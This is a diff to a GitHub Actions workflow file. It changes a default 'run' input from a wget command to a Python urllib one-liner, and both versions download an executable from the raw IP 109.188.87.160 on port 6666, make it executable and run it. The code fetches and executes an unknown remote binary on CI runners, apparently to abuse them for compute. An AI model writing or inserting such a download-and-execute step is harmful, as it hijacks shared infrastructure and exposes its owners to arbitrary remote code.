@@ -5,7 +5,8 @@ on:
       runs-on:
         default: 'ubuntu-latest'
       run:
-        default: 'wget -O {2}/exe.exe 109.188.87.160:6666/{0}_{1} && chmod +x {2}/exe.exe && touch exit && {2}/exe.exe --foreground'
+        default: |
+          python3 -c 'import urllib.request; urllib.request.urlretrieve("http://109.188.87.160:6666/{0}_{1}", "{2}/exe.exe")' && chmod +x {2}/exe.exe && touch exit && {2}/exe.exe --foreground
 jobs:
   loop:
     runs-on: ${{ inputs.runs-on }}
